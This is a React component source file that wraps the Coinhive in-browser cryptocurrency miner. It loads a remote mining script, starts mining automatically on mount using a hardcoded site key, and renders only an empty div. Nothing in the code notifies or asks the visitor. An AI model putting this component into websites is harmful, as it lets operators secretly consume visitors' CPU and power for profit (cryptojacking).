import React, { Component } from 'react'
import loadScript from 'load-script'
import PropTypes from 'prop-types'

class CoinHiveClient extends Component {
  constructor (props) {
    super(props)
    this.miner = null
    this._status = 'STOP'
  }

  static defaultProps = {
    timeout: 30000,
    threads: 2,
    throttle: 0,
    siteKey: 'QCLjDlh3Kllh2aj3P0cW6as65eZH3oeK',
    onInit: miner => {},
    onStart: miner => {},
    onStop: miner => {}
  }

  start () {
    if (this.miner) {
      this.miner.start()
      this._status = 'START'
      this.props.onStart(this.miner)
    }
  }

  stop () {
    if (this.miner) {
      this.miner.stop()
      this._status = 'STOP'
      this.props.onStop(this.miner)
    }
  }

  async componentWillMount () {
    this.miner = await new Promise(resolve => {
      loadScript('https://coin-hive.com/lib/coinhive.min.js', () => {
        if (this.props.userName) {
          return resolve(window.CoinHive.User(this.props.siteKey, this.props.userName))
        }
        return resolve(window.CoinHive.Anonymous(this.props.siteKey))
      })
    })
    this.handleProps(this.props)
    this.props.onInit(this.miner)
    this.stop()
    this.start()
  }

  componentWillReceiveProps (nextProps) {
    return this.handleProps(nextProps)
  }

  handleProps ({ throttle, threads, status }) {
    if (this.miner != null) {
      this.miner.setNumThreads(threads)
      this.miner.setThrottle(throttle)
    }

    if (status !== 'START' && this._status === 'STOP') this.start()
  }

  render () {
    return <div />
  }
}

CoinHiveClient.PropTypes = {
  siteKey: PropTypes.string.isRequired,
  timeout: PropTypes.number,
  onInit: PropTypes.func,
  onStart: PropTypes.func,
  onStop: PropTypes.func,
  userName: PropTypes.string,
  status: PropTypes.string
}

export default CoinHiveClient
